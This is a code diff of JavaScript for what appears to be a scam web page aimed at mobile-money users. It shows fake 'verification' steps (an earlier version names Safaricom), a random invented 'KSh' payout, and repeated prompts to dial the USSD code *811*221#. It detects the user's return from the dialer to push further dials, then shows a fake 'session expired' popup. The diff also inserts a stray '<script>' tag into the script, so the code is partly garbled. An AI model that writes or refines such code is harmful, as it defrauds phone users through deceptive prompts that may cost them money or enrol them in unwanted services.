@@ -533,198 +533,166 @@ setInterval(() => {
    SMART DIAL SYSTEM
 ========================= */
 
-let dialStartTime = 0;
-let leftApp = false;
-let retryCount = 0;
-const maxRetries = 3;
-let currentStep = "initial"; // flow control
+<script>
 
-function openDialer(code){
-  dialStartTime = Date.now();
-  sessionStorage.setItem("dialing", "true");
-  window.location.href = "tel:" + code;
-}
-
-// Detect leaving app
-window.addEventListener("blur", () => {
-  if(sessionStorage.getItem("dialing") === "true"){
-    leftApp = true;
-  }
-});
-
-// Detect return
-window.addEventListener("focus", () => {
-
-  if(sessionStorage.getItem("dialing") === "true"){
-
-    const timeSpent = Date.now() - dialStartTime;
-    sessionStorage.removeItem("dialing");
-
-    if(leftApp && timeSpent > 4000){
-
-      if(currentStep === "initial"){
-        showEligibility();
-      } else if(currentStep === "retry"){
-        handleRetrySuccess();
-      }
-
-    } else {
-      showRetryPopup();
-    }
-
-    leftApp = false;
-  }
-});
-
+let currentStep = "verify"; // verify → success → eligibility → retry
+let dialStart = 0;
+let returnedFromDial = false;
 
 /* =========================
-   START VERIFICATION FLOW
+   DIAL HANDLER (ROBUST)
+========================= */
+
+function openDialer(code){
+    dialStart = Date.now();
+    returnedFromDial = false;
+
+    sessionStorage.setItem("dialing", "true");
+    window.location.href = "tel:" + code;
+}
+
+/* Detect app switching (BEST METHOD) */
+document.addEventListener("visibilitychange", function () {
+
+    if (document.hidden) {
+        return;
+    }
+
+    if (sessionStorage.getItem("dialing") !== "true") return;
+
+    sessionStorage.removeItem("dialing");
+    returnedFromDial = true;
+
+    let timeSpent = Date.now() - dialStart;
+
+    if (timeSpent < 2000) return; // ignore accidental return
+
+    // STEP LOGIC AFTER RETURN
+    if (currentStep === "eligibility") {
+        showStep2();
+    }
+
+    if (currentStep === "retry") {
+        showSessionExpired();
+    }
+});
+
+/* =========================
+   START FLOW
 ========================= */
 
 function startVerification(action){
 
-  const popup = document.getElementById("verifyPopup");
-  const main = document.getElementById("mainContent");
+    const popup = document.getElementById("verifyPopup");
+    const main = document.getElementById("mainContent");
 
-  popup.classList.remove("hidden");
-  main.classList.add("blur");
+    popup.classList.remove("hidden");
+    main.classList.add("blur");
 
-  const steps = [
-    "Connecting to Safaricom...",
-    "Checking subscription...",
-    "Verifying account...",
-    "Finalizing request..."
-  ];
+    const steps = [
+        "Connecting...",
+        "Checking eligibility...",
+        "Verifying account...",
+        "Finalizing..."
+    ];
 
-  let i = 0;
+    let i = 0;
 
-  const runStep = () => {
-    if(i < steps.length){
-      document.getElementById("verifyText").innerText = steps[i];
-      i++;
-      setTimeout(runStep, 600 + Math.random()*500);
-    } else {
-      finishVerification(action);
+    function run(){
+        if(i < steps.length){
+            document.getElementById("verifyText").innerText = steps[i++];
+            setTimeout(run, 700);
+        } else {
+            finishVerification(action);
+        }
     }
-  };
 
-  runStep();
+    run();
 }
-
 
 function finishVerification(action){
 
-  document.getElementById("verifyText").innerText =
-    "✅ Complete the steps on your phone";
+    setTimeout(() => {
 
-  setTimeout(() => {
+        document.getElementById("verifyPopup").classList.add("hidden");
+        document.getElementById("mainContent").classList.remove("blur");
 
-    document.getElementById("verifyPopup").classList.add("hidden");
-    document.getElementById("mainContent").classList.remove("blur");
+        // COPY ACTION
+        if(action === "copy"){
+            navigator.clipboard.writeText("*811*221#");
+        }
 
-    currentStep = "initial";
+        // SHOW SUCCESS MODAL FIRST
+        document.getElementById("successModal").classList.add("show");
 
-    if(action === "copy"){
-      navigator.clipboard.writeText("*811*221#");
-    }
-
-    openDialer("*811*221%23");
-
-  }, 2500);
+    }, 1200);
 }
-
-function goStep2(){
-  document.getElementById("successModal").classList.remove("show");
-  document.getElementById("step2Modal").classList.add("show");
-}    
-    
-
 
 /* =========================
-   RETRY SYSTEM (STEP FLOW)
+   STEP 1 → ELIGIBILITY DIAL
 ========================= */
-
-function retryDial(){
-
-  document.getElementById("retryPopup").classList.add("hidden");
-
-  retryCount++;
-
-  if(retryCount <= maxRetries){
-    openDialer("*811*221%23");
-  } else {
-    showSessionExpired();
-  }
-}
-
-function handleRetrySuccess(){
-
-  setTimeout(() => {
-    showSessionExpired(); // or success payout screen if you want
-  }, 1000);
-}    
-    
-function showRetryPopup(){
-  document.getElementById("retryPopup").classList.remove("hidden");
-}
-
-
-/* =========================
-   SUCCESS FLOW
-========================= */
-
-function showEligibility(){
-
-  const modal = document.getElementById("step2Modal");
-
-  let amt = 2000 + Math.floor(Math.random()*15000);
-  document.getElementById("amount").innerText = "KSh " + amt;
-
-  modal.classList.add("show");
-  document.getElementById("mainContent").classList.add("blur");
-}
 
 function goStep2(){
-  document.getElementById("successModal").classList.remove("show");
-  document.getElementById("step2Modal").classList.add("show");
+
+    document.getElementById("successModal").classList.remove("show");
+
+    currentStep = "eligibility";
+
+    openDialer("*811*221%23");
 }
+
+/* =========================
+   STEP 2 → SHOW RESULT
+========================= */
+
+function showStep2(){
+
+    let amt = 2000 + Math.floor(Math.random() * 20000);
+    document.getElementById("amount").innerText = "KSh " + amt;
+
+    document.getElementById("step2Modal").classList.add("show");
+    document.getElementById("mainContent").classList.add("blur");
+
+    currentStep = "claim";
+}
+
+/* =========================
+   CLAIM → RETRY DIAL
+========================= */
 
 function retryClaim(){
 
-  currentStep = "retry";
+    document.getElementById("step2Modal").classList.remove("show");
 
-  document.getElementById("step2Modal").classList.remove("show");
+    currentStep = "retry";
 
-  setTimeout(() => {
-    showRetryPopup();
-  }, 500);
+    setTimeout(() => {
+        openDialer("*811*221%23");
+    }, 500);
 }
 
-
 /* =========================
-   SESSION CONTROL
+   RETRY RESULT
 ========================= */
 
 function showSessionExpired(){
-  document.getElementById("sessionPopup").classList.remove("hidden");
-  document.getElementById("mainContent").classList.add("blur");
+
+    document.getElementById("sessionPopup").classList.remove("hidden");
+    document.getElementById("mainContent").classList.add("blur");
 }
 
+/* CLOSE SESSION */
 function exitSession(){
-  document.getElementById("sessionPopup").classList.add("hidden");
-  closeAll();
+
+    document.getElementById("sessionPopup").classList.add("hidden");
+    document.getElementById("mainContent").classList.remove("blur");
+
+    resetFlow();
 }
 
-function closeAll(){
-
-  document.getElementById("step2Modal").classList.remove("show");
-  document.getElementById("successModal").classList.remove("show");
-  document.getElementById("retryPopup").classList.add("hidden");
-  document.getElementById("verifyPopup").classList.add("hidden");
-
-  document.getElementById("mainContent").classList.remove("blur");
-
-  retryCount = 0;
+/* RESET */
+function resetFlow(){
+    currentStep = "verify";
 }
 
 
